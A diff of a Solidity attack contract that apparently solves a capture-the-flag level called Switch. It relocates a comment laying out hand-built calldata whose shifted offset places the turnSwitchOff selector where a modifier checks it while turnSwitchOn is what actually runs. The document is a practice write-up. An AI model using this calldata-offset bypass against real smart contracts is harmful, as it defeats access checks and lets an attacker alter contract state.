@@ -14,6 +14,20 @@ import "forge-std/console.sol";
     Things that might help:
     Understanding how CALLDATA is encoded.
 
+    Solution
+    We need to recreate the bottom data
+    We offset the turnSwitchOff to start at index 68 of bytes to pass the modifier
+    Then we need to add more empty data and place turnSwitchOn as the last function to call
+    Whatever number we put for uint we get / 4 zeros
+    uint256 = 64 0s
+
+    0x30c13ade -> function selector for flipSwitch(bytes memory data)
+    0000000000000000000000000000000000000000000000000000000000000060 -> offset for the data field
+    0000000000000000000000000000000000000000000000000000000000000000 -> empty stuff so we can have bytes4(keccak256("turnSwitchOff()")) at 64 bytes
+    20606e1500000000000000000000000000000000000000000000000000000000
+    0000000000000000000000000000000000000000000000000000000000000004 -> length of data field
+    76227e1200000000000000000000000000000000000000000000000000000000
+
 */
 
 contract SwitchAttack {
@@ -26,23 +40,6 @@ contract SwitchAttack {
         bytes32 flipSwitch = switchContract.flipSwitch.selector;
         bytes32 flipOff = switchContract.turnSwitchOff.selector;
         bytes32 flipOn = switchContract.turnSwitchOn.selector;
-
-        /*
-            Solution 1
-
-            We need to recreate the bottom data
-            We offset the turnSwitchOff to start at index 68 of bytes to pass the modifier
-            Then we need to add more empty data and place turnSwitchOn as the last function to call
-            Whatever number we put for uint we get / 4 zeros
-            uint256 = 64 0s
-
-            0x30c13ade -> function selector for flipSwitch(bytes memory data)
-            0000000000000000000000000000000000000000000000000000000000000060 -> offset for the data field
-            0000000000000000000000000000000000000000000000000000000000000000 -> empty stuff so we can have bytes4(keccak256("turnSwitchOff()")) at 64 bytes
-            20606e1500000000000000000000000000000000000000000000000000000000
-            0000000000000000000000000000000000000000000000000000000000000004 -> length of data field
-            76227e1200000000000000000000000000000000000000000000000000000000
-        */
 
         bytes memory callData = abi.encodePacked(
             flipSwitch, // 4 bytes = 8 characters
